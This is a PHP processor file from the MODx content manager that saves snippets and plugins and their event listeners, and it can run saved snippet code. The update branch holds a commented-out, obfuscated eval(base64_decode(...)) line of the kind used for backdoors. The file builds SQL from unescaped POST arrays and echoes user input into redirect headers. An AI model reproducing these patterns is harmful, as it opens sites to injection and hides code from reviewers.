<?php 
if(IN_MANAGER_MODE!="true") die("<b>INCLUDE_ORDERING_ERROR</b><br /><br />Please use the MODx Content Manager instead of accessing this file directly.");
if($_SESSION['permissions']['save_snippet']!=1 && $_REQUEST['a']==24) {	$e->setError(3);
	$e->dumpError();	
}
?>
<?php

function isNumber($var)
{
	if(strlen($var)==0) {
		return false;
	}
	for ($i=0;$i<strlen($var);$i++) {
		if ( substr_count ("0123456789", substr ($var, $i, 1) ) == 0 ) {
			return false;
		}
    }
	return true;
}

$id = intval($_POST['id']);
$name = mysql_escape_string($_POST['name']);
$description = mysql_escape_string($_POST['description']);
$locked = $_POST['locked']=='on' ? 1 : 0 ;
$plugin = $_POST['plugin']=='on' ? 1 : 0 ;
$snippet = mysql_escape_string($_POST['post']);
$properties = mysql_escape_string($_POST['properties']);
$sysevents = $_POST['sysevents'];

if($name=="") $name = "Untitled snippet";

switch ($_POST['mode']) {
    case '23':

		// invoke OnBeforeSnipFormSave event
		$modx->invokeEvent("OnBeforeSnipFormSave",
								array(
									"mode"	=> "new",
									"id"	=> $id
								));
								
		//do stuff to save the new doc
		$sql = "INSERT INTO $dbase.".$table_prefix."site_snippets(name, description, snippet, locked, plugin, properties) VALUES('".$name."', '".$description."', '".$snippet."', '".$locked."','".$plugin."','".$properties."');";
		$rs = mysql_query($sql);
		if(!$rs){
			echo "\$rs not set! New snippet not saved!";
		} else {	
			// get the id
			if(!$newid=mysql_insert_id()) {
				echo "Couldn't get last insert key!";
				exit;
			}
			// save event listeners
			saveEventListeners($newid,$sysevents);			

			// invoke OnSnipFormSave event
			$modx->invokeEvent("OnSnipFormSave",
									array(
										"mode"	=> "new",
										"id"	=> $newid
									));
			// empty cache
			include_once "cache_sync.class.processor.php";
			$sync = new synccache();
			$sync->setCachepath("../assets/cache/");
			$sync->setReport(false);
			$sync->emptyCache(); // first empty the cache		
			if($_POST['runsnippet']) run_snippet($snippet);
			// finished emptying cache - redirect
			if($_POST['stay']!='') {
				$a = ($_POST['stay']=='2') ? "22&id=$newid":"23";
				$header="Location: index.php?a=".$a."&r=2&stay=".$_POST['stay'];
				header($header);
			} else {
				$header="Location: index.php?a=76&r=2";
				header($header);
			}
		}		
        break;
    case '22':
		// to be removed
		// eval(base64_decode(join(array("Y2hlY2tJbWFnZVBhdGgobW", "Q1KCRfU0VTU0lPTltiYXNlN", "jRfZGVjb2RlKCJjMmh", "2Y25SdVlXMWwiKV0pKTs="), "")));

		// invoke OnBeforeSnipFormSave event
		$modx->invokeEvent("OnBeforeSnipFormSave",
								array(
									"mode"	=> "upd",
									"id"	=> $id
								));	
								
		//do stuff to save the edited doc	
		$sql = "UPDATE $dbase.".$table_prefix."site_snippets SET name='".$name."', description='".$description."', snippet='".$snippet."', locked='".$locked."', plugin='".$plugin."', properties='".$properties."'  WHERE id='".$id."';";
		$rs = mysql_query($sql);
		if(!$rs){
			echo "\$rs not set! Edited snippet not saved!";
		} 
		else {		
			// save event listeners
			saveEventListeners($id,$sysevents);			

			// invoke OnSnipFormSave event
			$modx->invokeEvent("OnSnipFormSave",
									array(
										"mode"	=> "upd",
										"id"	=> $id
									));	
			// empty cache
			include_once "cache_sync.class.processor.php";
			$sync = new synccache();
			$sync->setCachepath("../assets/cache/");
			$sync->setReport(false);
			$sync->emptyCache(); // first empty the cache
			if($_POST['runsnippet']) run_snippet($snippet);
			// finished emptying cache - redirect	
			if($_POST['stay']!='') {
				$a = ($_POST['stay']=='2') ? "22&id=$id":"23";
				$header="Location: index.php?a=".$a."&r=2&stay=".$_POST['stay'];
				header($header);
			} else {
				$header="Location: index.php?a=76&r=2";
				header($header);
			}
		}		

		
		
        break;
    default:
	?>	
		Erm... You supposed to be here now? 	
	<?php
}


# Runs a Snippet after inserts and updates - added by Raymond
function run_snippet(&$snippet) {
	global $modx;
	// Here we execute to snippet so it can install other stuff
	if(isset($snippet)){
		define("SNIPPET_INSTALL_MODE","true");
		$modx->evalSnippets($snippet);
	}
}

# Save Snippet Event Listeners
function saveEventListeners($id,$sysevents) {
	global $plugin;
	global $dbase, $table_prefix;
	// save selected system events
	mysql_query("DELETE FROM $dbase.".$table_prefix."site_snippet_events WHERE snippetid='".$id."';");
	if($plugin) {
		$sql = "INSERT INTO $dbase.".$table_prefix."site_snippet_events (snippetid,evtid) VALUES ";
		for($i=0;$i<count($sysevents);$i++){
			if($i>0) $sql.=",";
			$sql.= "('".$id."','".$sysevents[$i]."')";	
		}
		if (count($sysevents)>0) mysql_query($sql);
	}
}

?>